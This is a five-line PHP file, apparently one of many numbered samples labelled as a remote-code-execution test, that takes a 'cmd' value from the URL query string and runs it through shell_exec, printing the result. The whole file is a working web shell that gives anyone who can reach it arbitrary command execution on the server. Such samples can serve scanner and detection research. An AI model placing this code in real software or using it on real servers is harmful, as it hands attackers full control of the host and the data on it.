<?php
// RCE test variation #843
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>